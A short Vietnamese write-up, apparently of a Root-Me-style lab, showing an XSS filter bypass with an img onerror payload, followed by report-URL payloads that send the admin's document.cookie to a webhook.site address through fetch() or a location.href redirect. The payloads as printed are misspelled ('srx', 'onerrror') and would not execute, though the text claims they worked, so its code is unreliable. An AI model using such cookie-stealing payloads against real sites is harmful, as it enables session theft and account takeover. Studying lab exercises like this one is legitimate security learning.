Xin chào các bạn thì đây là chuỗi các bài mình sưu tầm được các bạn theo dõi nha :3
 
Thì bài đầu tiên nó y sì như cái lab trong root-me
Một bài xss đã fillter đi thẻ <script> rồi

-- Nên mình sẽ thử dùng thuộc tính onerror của ảnh để thực hiện injection

Payload:
                                        <img srx=x onerrror=alert('hihihi') />
Thì thành công nên bây giờ mình sẽ gửi report này cho admin


url?params=<img srx=x onerrror=fetch(`http://webhook.site/38bc6754-b246-4dbf-b3ab-5d0bfc9a62dd?a=${document.cookie}`) />
hay ta ó thể dùng payload như sau:
                                         url?params=<img srx=x onerrror=location.href=`http://webhook.site/38bc6754-b246-4dbf-b3ab-5d0bfc9a62dd?a=${document.cookie}` />

Và kết quả đã được gửi đến bên webhook

Chúc bạn thành công
